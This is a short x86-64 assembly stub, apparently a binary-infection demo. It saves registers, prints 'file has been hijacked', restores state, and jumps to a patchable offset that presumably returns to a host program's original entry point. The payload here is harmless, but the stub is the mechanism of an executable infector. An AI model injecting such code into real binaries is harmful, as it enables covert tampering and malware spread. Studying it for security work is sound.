        .global _start
        .text
_start:
	push	%rax
	push	%rdi
	push	%rsi
	push	%rdx
	mov     $1, %rax
        mov     $1, %rdi
	lea	(%rip), %rsi
	add	$34, %rsi
        mov     $36, %rdx
        syscall
	pop	%rdx
	pop	%rsi
	pop	%rdi
	pop	%rax
	lea	(%rip), %r10
	sub	$0x1111, %r10  # Patch 0x111 with computed offset
	jmp	%r10

msg:
        .ascii  "Muahahaha - file has been hijacked\n"
